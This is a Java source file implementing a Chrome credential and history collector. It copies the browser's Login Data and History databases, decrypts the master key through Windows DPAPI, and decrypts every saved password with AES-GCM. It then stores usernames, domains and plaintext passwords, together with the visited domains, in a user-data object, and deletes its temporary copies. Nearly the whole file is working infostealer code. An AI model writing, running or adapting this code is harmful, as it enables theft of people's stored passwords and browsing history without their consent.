import java.util.*;
import java.sql.*;
import java.io.*;
import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

import com.sun.jna.platform.win32.Crypt32Util;
import java.nio.charset.StandardCharsets;

class ChromeDataCollector {
    public static void getData() {
        try {
            File loginDataDatabase = new File("loginData.db");
            File historyDatabase = new File("history.db");

            System.out.println("[*] Reading Chrome Login Data file");
            System.out.println("[*] Reading Chrome History file");
            copyFiles(new File(ChromeInstallation.getLoginDataPath()), loginDataDatabase);
            copyFiles(new File(ChromeInstallation.getHistoryPath()), historyDatabase);
            getLoginData();
            getHistoryData();
    
        } catch (Exception e) {
            System.out.println("[*] Exception occurred: " + e + "\n[*] Terminating");
            System.exit(0);
        }finally{
            File loginDataDatabase = new File("loginData.db");
            File historyDatabase = new File("history.db");
            loginDataDatabase.delete();
            historyDatabase.delete();
        }
    }

    private static void copyFiles(File src, File dest) throws Exception {
        InputStream is = null;
        OutputStream os = null;
        try {
            is = new FileInputStream(src);
            os = new FileOutputStream(dest);
            byte[] buf = new byte[1024];
            int bytesRead;
            while ((bytesRead = is.read(buf)) > 0) {
                os.write(buf, 0, bytesRead);
            }
        } finally {
            is.close();
            os.close();
        }
    }

    private static void getLoginData() throws Exception {
        List<Credential> credentials = new ArrayList<Credential>();
        SecretKey secret_key = decodeSecretKey();
        Connection c = null;
        Statement stmt = null;

        Class.forName("org.sqlite.JDBC");
        c = DriverManager.getConnection("jdbc:sqlite:" + System.getProperty("user.dir") + "\\loginData.db");
        c.setAutoCommit(false);

        stmt = c.createStatement();
        ResultSet rs = stmt.executeQuery("select action_url, username_value, password_value from logins");
        System.out.println("[*] Decrypting credentials");

        while (rs.next()) {
            String url = rs.getString("action_url");
            String username = rs.getString("username_value");
            byte[] cipher = rs.getBytes("password_value");
            if (url != "" || username != "") {
    
                byte[] initialization_vector = Arrays.copyOfRange(cipher, 3, 15);
                byte[] encrypted_password = Arrays.copyOfRange(cipher, 15, cipher.length);
                String password = decryptCipher(encrypted_password, initialization_vector, secret_key);
                credentials.add(new Credential(username, extractDomain(url), password));
            }
        }
        UserData.setCredentials(credentials);
        rs.close();
        stmt.close();
        c.close();
    }

    private static SecretKey decodeSecretKey() {
        String secret_key = ChromeInstallation.getChromeMasterKey();
        Base64.Decoder decoder = Base64.getDecoder();
        byte[] decodedKey = decoder.decode(secret_key);
        byte[] encryptedMasterKey = Arrays.copyOfRange(decodedKey, 5, decodedKey.length);
        byte[] masterKey = Crypt32Util.cryptUnprotectData(encryptedMasterKey);
        SecretKey secretKey = new SecretKeySpec(masterKey, 0, masterKey.length, "AES");
        return secretKey;
    }

    private static String decryptCipher(byte[] encrypted_password, byte[] initialization_vector, SecretKey secretKey)
            throws Exception {
        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        cipher.init(Cipher.DECRYPT_MODE, secretKey, new GCMParameterSpec(128, initialization_vector));
        byte[] plainText = cipher.doFinal(encrypted_password);
        return new String(plainText, StandardCharsets.UTF_8);
    }

    private static void getHistoryData() throws Exception {
        Set<String> history = new HashSet<String>();
        Connection c = null;
        Statement stmt = null;
        Class.forName("org.sqlite.JDBC");
        c = DriverManager.getConnection("jdbc:sqlite:" + System.getProperty("user.dir") + "\\history.db");
        c.setAutoCommit(false);

        stmt = c.createStatement();
        ResultSet rs = stmt.executeQuery("select url from urls");
        System.out.println("[*] Getting Browser History");
        while (rs.next()) {
            String url = rs.getString("url");
            history.add(extractDomain(url));
        }
        System.out.println("[*] Total history Url's: " + history.size());
        UserData.setBrowserHistory(history);
        System.out.println("[*] Total history Url's: " + UserData.browserHistory.size());
    }

    private static String extractDomain(String url) {
        url = url.substring(url.indexOf("//") + 2, url.length());
        url = url.substring(0, url.indexOf("/"));
        return url;
    }
}
